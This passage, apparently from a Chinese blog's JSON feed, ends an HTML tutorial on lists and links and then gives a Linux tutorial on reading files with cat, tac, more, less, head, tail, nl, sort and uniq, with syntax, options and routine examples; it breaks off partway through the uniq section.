元素包围。</li>\n<li><strong>有序列表</strong>（Ordered List）中项目的顺序很重要，就像烹调指南。用一个 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRNTC9FbGVtZW50L29s\">``</span> 元素包围。</li>\n</ol>\n<p>列表的每个项目用一个列表项目（List Item）元素 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRNTC9FbGVtZW50L2xp\">``</span> 包围。</p>\n<p>比如，要将下面的段落片段改成一个列表：</p>\n<p>HTMLCopy to Clipboard</p>\n<pre><code>&lt;p&gt;\n  At Mozilla, we're a global community of technologists, thinkers, and builders\n  working together…\n&lt;/p&gt;\n</code></pre>\n<p>可以这样更改标记：</p>\n<p>HTMLCopy to Clipboard</p>\n<pre><code>&lt;p&gt;At Mozilla, we're a global community of&lt;/p&gt;\n\n&lt;ul&gt;\n  &lt;li&gt;technologists&lt;/li&gt;\n  &lt;li&gt;thinkers&lt;/li&gt;\n  &lt;li&gt;builders&lt;/li&gt;\n&lt;/ul&gt;\n\n&lt;p&gt;working together…&lt;/p&gt;\n</code></pre>\n<p>试着在示例页面中添加一个有序列表和无序列表。</p>\n<h2 id=\"链接\"><a class=\"anchor\" href=\"#链接\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9MZWFybi9HZXR0aW5nX3N0YXJ0ZWRfd2l0aF90aGVfd2ViL0hUTUxfYmFzaWNzIyVFOSU5MyVCRSVFNiU4RSVBNQ==\">链接</span></h2>\n<p>链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — <span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSFRNTC9FbGVtZW50L2E=\">``</span>— a 是&quot;anchor&quot; （锚）的缩写。要将一些文本添加到链接中，只需如下几步：</p>\n<ol>\n<li>\n<p>选择一些文本。比如 “Mozilla Manifesto”。</p>\n</li>\n<li>\n<p>将文本包含在</p>\n<p><code>&lt;a&gt;</code></p>\n<p>元素内，就像这样：</p>\n<p>HTMLCopy to Clipboard</p>\n<pre><code>&lt;a&gt;Mozilla Manifesto&lt;/a&gt;\n</code></pre>\n</li>\n<li>\n<p>为此</p>\n<p><code>&lt;a&gt;</code></p>\n<p>元素添加一个</p>\n<pre><code>href\n</code></pre>\n<p>属性，就像这样：</p>\n<p>HTMLCopy to Clipboard</p>\n<pre><code>&lt;a href=&quot;&quot;&gt;Mozilla Manifesto&lt;/a&gt;\n</code></pre>\n</li>\n<li>\n<p>把属性的值设置为所需网址：</p>\n<p>HTMLCopy to Clipboard</p>\n<pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;\n  &gt;Mozilla Manifesto&lt;/a\n&gt;\n</code></pre>\n</li>\n</ol>\n<p>如果网址开始部分省略了  <code>https://</code>  或者  <code>http://</code> ，可能会得到错误的结果。在完成一个链接后，可以试着点击它来确保指向正确。</p>\n<p><strong>备注：</strong>  <code>href</code>  这个名字可能开始看起来有点令人费解，代表超文本引用（ <strong>h</strong>ypertext <strong>ref</strong>erence）。</p>\n<p>现在就为页面添加一个链接吧。</p>\n",
            "tags": [
                "杂谈小记",
                "web开发",
                "web开发"
            ]
        },
        {
            "id": "https://p1kap1.github.io/knowledge/Linux%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4/",
            "url": "https://p1kap1.github.io/knowledge/Linux%E5%AF%B9%E6%96%87%E4%BB%B6%E7%9A%84%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4/",
            "title": "Linux对文件读取的命令",
            "date_published": "2023-11-06T16:00:00.000Z",
            "content_html": "<h2 id=\"cat-命令\"><a class=\"anchor\" href=\"#cat-命令\">#</a> cat 命令</h2>\n<p>cat（英文全拼：concatenate）命令用于连接文件并打印到标准输出设备上。</p>\n<h3 id=\"使用权限\"><a class=\"anchor\" href=\"#使用权限\">#</a> 使用权限</h3>\n<p>所有使用者</p>\n<h3 id=\"语法格式\"><a class=\"anchor\" href=\"#语法格式\">#</a> 语法格式</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token punctuation\">[</span>-AbeEnstTuv<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--version<span class=\"token punctuation\">]</span> fileName</pre></td></tr></table></figure><h3 id=\"参数说明\"><a class=\"anchor\" href=\"#参数说明\">#</a> 参数说明：</h3>\n<p>-n 或 --number：由 1 开始对所有输出的行数编号。</p>\n<p>-b 或 --number-nonblank：和 -n 相似，只不过对于空白行不编号。</p>\n<p>-s 或 --squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行。</p>\n<p>-v 或 --show-nonprinting：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外。</p>\n<p>-E 或 --show-ends : 在每行结束处显示 $。</p>\n<p>-T 或 --show-tabs: 将 TAB 字符显示为 ^I。</p>\n<p>-A, --show-all：等价于 -vET。</p>\n<p>-e：等价于 &quot;-vE&quot; 选项；</p>\n<p>-t：等价于 &quot;-vT&quot; 选项；</p>\n<h3 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例：</h3>\n<p>把 textfile1 的文档内容加上行号后输入 textfile2 这个文档里：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token parameter variable\">-n</span> textfile1 <span class=\"token operator\">></span> textfile2</pre></td></tr></table></figure><p>把 textfile1 和 textfile2 的文档内容加上行号（空白行不加）之后将内容附加到 textfile3 文档里：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> <span class=\"token parameter variable\">-b</span> textfile1 textfile2 <span class=\"token operator\">>></span> textfile3</pre></td></tr></table></figure><p>清空 /etc/test.txt 文档内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /dev/null <span class=\"token operator\">></span> /etc/test.txt</pre></td></tr></table></figure><p>cat 也可以用来制作镜像文件。例如要制作软盘的镜像文件，将软盘放好后输入：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /dev/fd0 <span class=\"token operator\">></span> OUTFILE</pre></td></tr></table></figure><p>相反的，如果想把 image file 写到软盘，输入：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> IMG_FILE <span class=\"token operator\">></span> /dev/fd0</pre></td></tr></table></figure><p><strong>注</strong>：</p>\n<ul>\n<li>\n<ol>\n<li>OUTFILE 指输出的镜像文件名。</li>\n</ol>\n</li>\n<li>\n<ol start=\"2\">\n<li>IMG_FILE 指镜像文件。</li>\n</ol>\n</li>\n<li>\n<ol start=\"3\">\n<li>若从镜像文件写回 device 时，device 容量需与相当。</li>\n</ol>\n</li>\n<li>\n<ol start=\"4\">\n<li>通常用制作开机磁片。</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"tac命令\"><a class=\"anchor\" href=\"#tac命令\">#</a> tac 命令</h2>\n<p>tac 命令是 cat 反向写的，它们的功能也相反，作用是将文件内容全部显示在屏幕上，但是是从最后一行开始反向显示。</p>\n<p>tac 语法：tac filename。</p>\n<h2 id=\"more命令\"><a class=\"anchor\" href=\"#more命令\">#</a> more 命令</h2>\n<p>Linux more 命令类似 cat ，不过会以一页一页的形式显示，更方便使用者逐页阅读，而最基本的指令就是按空白键（space）就往下一页显示，按 b 键就会往回（back）一页显示，而且还有搜寻字串的功能（与 vi 相似），使用中的说明文件，请按 h 。</p>\n<h3 id=\"语法\"><a class=\"anchor\" href=\"#语法\">#</a> 语法</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">more</span> <span class=\"token punctuation\">[</span>-dlfpcsu<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>-num<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>+/pattern<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>+linenum<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>fileNames<span class=\"token punctuation\">..</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"参数\"><a class=\"anchor\" href=\"#参数\">#</a> <strong>参数</strong>：</h3>\n<ul>\n<li>-num 一次显示的行数</li>\n<li>-d 提示使用者，在画面下方显示 [Press space to continue, 'q' to quit.] ，如果使用者按错键，则会显示 [Press 'h' for instructions.] 而不是 ' 哔 ' 声</li>\n<li>-l 取消遇见特殊字元 ^L（送纸字元）时会暂停的功能</li>\n<li>-f 计算行数时，以实际上的行数，而非自动换行过后的行数（有些单行字数太长的会被扩展为两行或两行以上）</li>\n<li>-p 不以卷动的方式显示每一页，而是先清除萤幕后再显示内容</li>\n<li>-c 跟 -p 相似，不同的是先显示内容再清除其他旧资料</li>\n<li>-s 当遇到有连续两行以上的空白行，就代换为一行的空白行</li>\n<li>-u 不显示下引号 （根据环境变数 TERM 指定的 terminal 而有所不同）</li>\n<li>+/pattern 在每个文档显示前搜寻该字串（pattern），然后从该字串之后开始显示</li>\n<li>+num 从第 num 行开始显示</li>\n<li>fileNames 欲显示内容的文档，可为复数个数</li>\n</ul>\n<h3 id=\"实例-2\"><a class=\"anchor\" href=\"#实例-2\">#</a> 实例</h3>\n<p>逐页显示 testfile 文档内容，如有连续两行以上空白行则以一行空白行显示。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">more</span> <span class=\"token parameter variable\">-s</span> testfile</pre></td></tr></table></figure><p>从第 20 行开始显示 testfile 之文档内容。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">more</span> +20 testfile</pre></td></tr></table></figure><h3 id=\"常用操作命令\"><a class=\"anchor\" href=\"#常用操作命令\">#</a> 常用操作命令</h3>\n<ul>\n<li>Enter 向下 n 行，需要定义。默认为 1 行</li>\n<li>Ctrl+F 向下滚动一屏</li>\n<li>空格键 向下滚动一屏</li>\n<li>Ctrl+B 返回上一屏</li>\n<li>= 输出当前行的行号</li>\n<li>：f 输出文件名和当前行的行号</li>\n<li>V 调用 vi 编辑器</li>\n<li>! 命令 调用 Shell，并执行命令</li>\n<li>q 退出 more</li>\n</ul>\n<h2 id=\"less-命令\"><a class=\"anchor\" href=\"#less-命令\">#</a> less 命令</h2>\n<p>less 与 more 类似，less 可以随意浏览文件，支持翻页和搜索，支持向上翻页和向下翻页。</p>\n<h3 id=\"语法-2\"><a class=\"anchor\" href=\"#语法-2\">#</a> 语法</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">less</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> 文件</pre></td></tr></table></figure><h3 id=\"参数说明-2\"><a class=\"anchor\" href=\"#参数说明-2\">#</a> <strong>参数说明</strong>：</h3>\n<ul>\n<li>-b &lt;缓冲区大小&gt; 设置缓冲区的大小</li>\n<li>-e 当文件显示结束后，自动离开</li>\n<li>-f 强迫打开特殊文件，例如外围设备代号、目录和二进制文件</li>\n<li>-g 只标志最后搜索的关键词</li>\n<li>-i 忽略搜索时的大小写</li>\n<li>-m 显示类似 more 命令的百分比</li>\n<li>-N 显示每行的行号</li>\n<li>-o &lt;文件名&gt; 将 less 输出的内容在指定文件中保存起来</li>\n<li>-Q 不使用警告音</li>\n<li>-s 显示连续空行为一行</li>\n<li>-S 行过长时间将超出部分舍弃</li>\n<li>-x &lt;数字&gt; 将 &quot;tab&quot; 键显示为规定的数字空格</li>\n<li>/ 字符串：向下搜索 &quot;字符串&quot; 的功能</li>\n<li>? 字符串：向上搜索 &quot;字符串&quot; 的功能</li>\n<li>n：重复前一个搜索（与 / 或？有关）</li>\n<li>N：反向重复前一个搜索（与 / 或？有关）</li>\n<li>b 向上翻一页</li>\n<li>d 向后翻半页</li>\n<li>h 显示帮助界面</li>\n<li>Q 退出 less 命令</li>\n<li>u 向前滚动半页</li>\n<li>y 向前滚动一行</li>\n<li>空格键 滚动一页</li>\n<li>回车键 滚动一行</li>\n<li>[pagedown]： 向下翻动一页</li>\n<li>[pageup]： 向上翻动一页</li>\n</ul>\n<h3 id=\"实例-3\"><a class=\"anchor\" href=\"#实例-3\">#</a> 实例</h3>\n<p>1、查看文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">less</span> log2013.log</pre></td></tr></table></figure><p>2、ps 查看进程信息并通过 less 分页显示</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span> <span class=\"token operator\">|</span><span class=\"token function\">less</span></pre></td></tr></table></figure><p>3、查看命令历史使用记录并通过 less 分页显示</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span>root@localhost test<span class=\"token punctuation\">]</span><span class=\"token comment\"># history | less</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token number\">22</span>  <span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> tomcat6.0.32 root@192.168.120.203:/opt/soft</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">23</span>  <span class=\"token builtin class-name\">cd</span> <span class=\"token punctuation\">..</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token number\">24</span>  <span class=\"token function\">scp</span> <span class=\"token parameter variable\">-r</span> web root@192.168.120.203:/opt/</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">25</span>  <span class=\"token builtin class-name\">cd</span> soft</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token number\">26</span>  <span class=\"token function\">ls</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>……省略……</pre></td></tr></table></figure><p>4、浏览多个文件</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">less</span> log2013.log log2014.log</pre></td></tr></table></figure><p>说明：<br />\n输入 ：n 后，切换到 log2014.log<br />\n 输入 ：p 后，切换到 log2013.log</p>\n<h3 id=\"附加备注\"><a class=\"anchor\" href=\"#附加备注\">#</a> 附加备注</h3>\n<p>1. 全屏导航</p>\n<ul>\n<li>ctrl + F - 向前移动一屏</li>\n<li>ctrl + B - 向后移动一屏</li>\n<li>ctrl + D - 向前移动半屏</li>\n<li>ctrl + U - 向后移动半屏</li>\n</ul>\n<p>2. 单行导航</p>\n<ul>\n<li>j - 下一行</li>\n<li>k - 上一行</li>\n</ul>\n<p>3. 其它导航</p>\n<ul>\n<li>G - 移动到最后一行</li>\n<li>g - 移动到第一行</li>\n<li>q / ZZ - 退出 less 命令</li>\n</ul>\n<p>4. 其它有用的命令</p>\n<ul>\n<li>v - 使用配置的编辑器编辑当前文件</li>\n<li>h - 显示 less 的帮助文档</li>\n<li>&amp;pattern - 仅显示匹配模式的行，而不是整个文件</li>\n</ul>\n<p>5. 标记导航</p>\n<p>当使用 less 查看大文件时，可以在任何一个位置作标记，可以通过命令导航到标有特定标记的文本位置：</p>\n<ul>\n<li>ma - 使用 a 标记文本的当前位置</li>\n<li>'a - 导航到标记 a 处</li>\n</ul>\n<h2 id=\"head-命令\"><a class=\"anchor\" href=\"#head-命令\">#</a> head 命令</h2>\n<p>head 命令可用于查看文件的开头部分的内容，有一个常用的参数 -n 用于显示行数，默认为 10，即显示 10 行的内容。</p>\n<h3 id=\"命令格式\"><a class=\"anchor\" href=\"#命令格式\">#</a> 命令格式：</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span> <span class=\"token punctuation\">[</span>参数<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>文件<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"参数-2\"><a class=\"anchor\" href=\"#参数-2\">#</a> 参数：</h3>\n<ul>\n<li>-q 隐藏文件名</li>\n<li>-v 显示文件名</li>\n<li>-c &lt;数目&gt; 显示的字节数。</li>\n<li>-n &lt;行数&gt; 显示的行数。</li>\n</ul>\n<h3 id=\"实例-4\"><a class=\"anchor\" href=\"#实例-4\">#</a> 实例</h3>\n<p>要显示 runoob_notes.log 文件的开头 10 行，请输入以下命令 (默认带参赛 -n 10)：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span> runoob_notes.log</pre></td></tr></table></figure><p>以上命令等价于：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">10</span> runoon_notes.log</pre></td></tr></table></figure><p>显示 notes.log 文件的开头 5 行，请输入以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span> <span class=\"token parameter variable\">-n</span> <span class=\"token number\">5</span> runoob_notes.log</pre></td></tr></table></figure><p>显示文件前 20 个字节:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">head</span> <span class=\"token parameter variable\">-c</span> <span class=\"token number\">20</span> runoob_notes.log</pre></td></tr></table></figure><h2 id=\"tail-命令\"><a class=\"anchor\" href=\"#tail-命令\">#</a> tail 命令</h2>\n<p>tail 命令可用于查看文件的内容，有一个常用的参数 -f 常用于查阅正在改变的日志文件。</p>\n<p>tail -f filename 会把 filename 文件里的最尾部的内容显示在屏幕上，并且不断刷新，只要 filename 更新就可以看到最新的文件内容。</p>\n<h3 id=\"命令格式-2\"><a class=\"anchor\" href=\"#命令格式-2\">#</a> 命令格式：</h3>\n<pre><code>tail [参数] [文件]  \n</code></pre>\n<h3 id=\"参数-3\"><a class=\"anchor\" href=\"#参数-3\">#</a> 参数：</h3>\n<ul>\n<li>-f 循环读取</li>\n<li>-q 不显示处理信息</li>\n<li>-v 显示详细的处理信息</li>\n<li>-c &lt;数目&gt; 显示的字节数</li>\n<li>-n &lt;行数&gt; 显示文件的尾部 n 行内容</li>\n<li>--pid=PID 与 - f 合用，表示在进程 ID,PID 死掉之后结束</li>\n<li>-q, --quiet, --silent 从不输出给出文件名的首部</li>\n<li>-s, --sleep-interval=S 与 - f 合用，表示在每次反复的间隔休眠 S 秒</li>\n</ul>\n<p><strong>实例</strong></p>\n<p>要显示 notes.log 文件的最后 10 行，请输入以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tail</span> notes.log         <span class=\"token comment\"># 默认显示最后 10 行</span></pre></td></tr></table></figure><p>要跟踪名为 notes.log 的文件的增长情况，请输入以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token parameter variable\">-f</span> notes.log</pre></td></tr></table></figure><p>此命令显示 notes.log 文件的最后 10 行。当将某些行添加至 notes.log 文件时，tail 命令会继续显示这些行。 显示一直继续，直到您按下（Ctrl-C）组合键停止显示。</p>\n<p>显示文件 notes.log 的内容，从第 20 行至文件末尾:</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tail</span> <span class=\"token parameter variable\">-n</span> +20 notes.log</pre></td></tr></table></figure><p>显示文件 notes.log 的最后 10 个字符:</p>\n<pre><code class=\"language-basg\">tail -c 10 notes.log\n</code></pre>\n<h2 id=\"nl命令\"><a class=\"anchor\" href=\"#nl命令\">#</a> nl 命令</h2>\n<p>nl 命令的作用和 cat -n 类似，是将文件内容全部显示在屏幕上，并且是从第一行开始显示，同时会自动打印出行号。</p>\n<h3 id=\"命令格式-3\"><a class=\"anchor\" href=\"#命令格式-3\">#</a> 命令格式：</h3>\n<blockquote>\n<p>nl [-bnw] 文件名</p>\n</blockquote>\n<h3 id=\"参数-4\"><a class=\"anchor\" href=\"#参数-4\">#</a> 参数：</h3>\n<p>-b： 指定行号列出的方式，主要有两种：</p>\n<p>-b a： 表示会列出空白行的行号（类似与 cat -n）</p>\n<p>-b t： 表示不列出空白行的行号（这个是 nl 命令的默认选项，类似于 cat -b）</p>\n<p>-n： 指定行号表示的方法，主要有三种：</p>\n<p>-n ln： 行号在自己字段的最左方（也是屏幕的最左方）显示</p>\n<p>-n rn： 行号在自己字段的最右方显示，且前面不加 0（默认选项）</p>\n<p>-n rz： 行号在自己字段的最右方显示，但前面加 0</p>\n<p>-w &lt;数字&gt;： 指定行号字段的占用位数</p>\n<h2 id=\"sort-命令\"><a class=\"anchor\" href=\"#sort-命令\">#</a> sort 命令</h2>\n<p>Linux sort 命令用于将文本文件内容加以排序。</p>\n<p>sort 可针对文本文件的内容，以行为单位来排序。</p>\n<h3 id=\"语法-3\"><a class=\"anchor\" href=\"#语法-3\">#</a> 语法</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sort</span> <span class=\"token punctuation\">[</span>-bcdfimMnr<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-o<span class=\"token operator\">&lt;</span>输出文件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-t<span class=\"token operator\">&lt;</span>分隔字符<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>+<span class=\"token operator\">&lt;</span>起始栏位<span class=\"token operator\">></span>-<span class=\"token operator\">&lt;</span>结束栏位<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--verison<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>文件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-k field1<span class=\"token punctuation\">[</span>,field2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"参数说明-3\"><a class=\"anchor\" href=\"#参数说明-3\">#</a> 参数说明：</h3>\n<ul>\n<li>-b 忽略每行前面开始出的空格字符。</li>\n<li>-c 检查文件是否已经按照顺序排序。</li>\n<li>-d 排序时，处理英文字母、数字及空格字符外，忽略其他的字符。</li>\n<li>-f 排序时，将小写字母视为大写字母。</li>\n<li>-i 排序时，除了 040 至 176 之间的 ASCII 字符外，忽略其他的字符。</li>\n<li>-m 将几个排序好的文件进行合并。</li>\n<li>-M 将前面 3 个字母依照月份的缩写进行排序。</li>\n<li>-n 依照数值的大小排序。</li>\n<li>-u 意味着是唯一的 (unique)，输出的结果是去完重了的。</li>\n<li>-o &lt;输出文件&gt; 将排序后的结果存入指定的文件。</li>\n<li>-r 以相反的顺序来排序。</li>\n<li>-t &lt;分隔字符&gt; 指定排序时所用的栏位分隔字符。</li>\n<li>+&lt;起始栏位&gt;-&lt; 结束栏位 &gt; 以指定的栏位来排序，范围由起始栏位到结束栏位的前一栏位。</li>\n<li>--help 显示帮助。</li>\n<li>--version 显示版本信息。</li>\n<li>[-k field1 [,field2]] 按指定的列进行排序。</li>\n</ul>\n<h3 id=\"实例-5\"><a class=\"anchor\" href=\"#实例-5\">#</a> 实例</h3>\n<p>在使用 sort 命令以默认的式对文件的行进行排序，使用的命令如下：</p>\n<pre><code class=\"language-bashbash\">sort testfile \n</code></pre>\n<p>sort 命令将以默认的方式将文本文件的第一列以 ASCII 码的次序排列，并将结果输出到标准输出。</p>\n<p>使用 cat 命令显示 testfile 文件可知其原有的排序如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile      <span class=\"token comment\"># testfile 文件原有排序  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Linux <span class=\"token number\">85</span></pre></td></tr></table></figure><p>使用 sort 命令重排后的结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sort</span> testfile <span class=\"token comment\"># 重排结果  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Hello <span class=\"token number\">95</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Linux <span class=\"token number\">85</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span></pre></td></tr></table></figure><p>使用 -k 参数设置对第二列的值进行重排，结果如下：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">sort</span> testfile <span class=\"token parameter variable\">-k</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">test</span> <span class=\"token number\">30</span>  </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Linux <span class=\"token number\">85</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Hello <span class=\"token number\">95</span></pre></td></tr></table></figure><h2 id=\"uniq-命令\"><a class=\"anchor\" href=\"#uniq-命令\">#</a> uniq 命令</h2>\n<p>Linux uniq 命令用于检查及删除文本文件中重复出现的行列，一般与 sort 命令结合使用。</p>\n<p>uniq 可检查文本文件中重复出现的行列。</p>\n<h3 id=\"语法-4\"><a class=\"anchor\" href=\"#语法-4\">#</a> 语法</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uniq</span> <span class=\"token punctuation\">[</span>-cdu<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-f<span class=\"token operator\">&lt;</span>栏位<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-s<span class=\"token operator\">&lt;</span>字符位置<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>-w<span class=\"token operator\">&lt;</span>字符位置<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--help<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>--version<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>输入文件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>输出文件<span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h3 id=\"参数-5\"><a class=\"anchor\" href=\"#参数-5\">#</a> 参数：</h3>\n<ul>\n<li>-c 或 --count 在每列旁边显示该行重复出现的次数。</li>\n<li>-d 或 --repeated 仅显示重复出现的行列。</li>\n<li>-f &lt;栏位&gt; 或 --skip-fields=&lt; 栏位 &gt; 忽略比较指定的栏位。</li>\n<li>-s &lt;字符位置&gt; 或 --skip-chars=&lt; 字符位置 &gt; 忽略比较指定的字符。</li>\n<li>-u 或 --unique 仅显示出一次的行列。</li>\n<li>-w &lt;字符位置&gt; 或 --check-chars=&lt; 字符位置 &gt; 指定要比较的字符。</li>\n<li>--help 显示帮助。</li>\n<li>--version 显示版本信息。</li>\n<li>[输入文件] 指定已排序好的文本文件。如果不指定此项，则从标准读取数据；</li>\n<li>[输出文件] 指定输出的文件。如果不指定此选项，则将内容显示到标准输出设备（显示终端）。</li>\n</ul>\n<h3 id=\"实例-6\"><a class=\"anchor\" href=\"#实例-6\">#</a> 实例</h3>\n<p>文件 testfile 中第 2、3、5、6、7、9 行为相同的行，使用 uniq 命令删除重复的行，可使用以下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">uniq</span> testfile</pre></td></tr></table></figure><p>testfile 中的原有内容为：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ <span class=\"token function\">cat</span> testfile      <span class=\"token comment\">#原有内容  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">test</span> 